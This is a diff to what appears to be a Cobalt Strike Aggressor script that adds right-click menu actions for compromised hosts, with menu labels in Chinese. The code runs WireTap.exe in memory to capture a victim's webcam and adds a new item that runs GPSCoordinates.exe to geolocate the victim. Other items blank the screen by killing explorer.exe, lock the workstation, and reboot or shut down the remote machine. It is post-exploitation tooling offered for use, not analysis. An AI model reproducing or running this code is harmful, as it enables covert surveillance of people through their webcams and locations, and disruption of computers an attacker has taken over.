@@ -58,21 +58,25 @@ sub WireTap_webcam {
 	bexecute_assembly($bid, script_resource("/script/WireTap.exe"), $arg);
 }	
 
-                item "黑屏"{
+			item "定位" {
+			bexecute_assembly($1, script_resource("/script/GPSCoordinates.exe"), "");
+		}
+
+            item "黑屏"{
                     bshell($1,"taskkill /F /IM explorer.exe");
                 }
-                item "锁屏"{
+            item "锁屏"{
                     bshell($1,"rundll32.exe user32.dll,LockWorkStation");
                 }
-                item "亮屏"{
+            item "亮屏"{
                     brun($1, "explorer.exe");
                 }
-			    item "重启" {
+			item "重启" {
              prompt_text("确定重启?", "", lambda({
             bshell(@ids, "shutdown -r -t 0");
         }, @ids => $1));
     }	
-			    item "关机" {
+			item "关机" {
              prompt_text("确定?", "", lambda({
             bshell(@ids, "shutdown -s -t 0");
         }, @ids => $1));
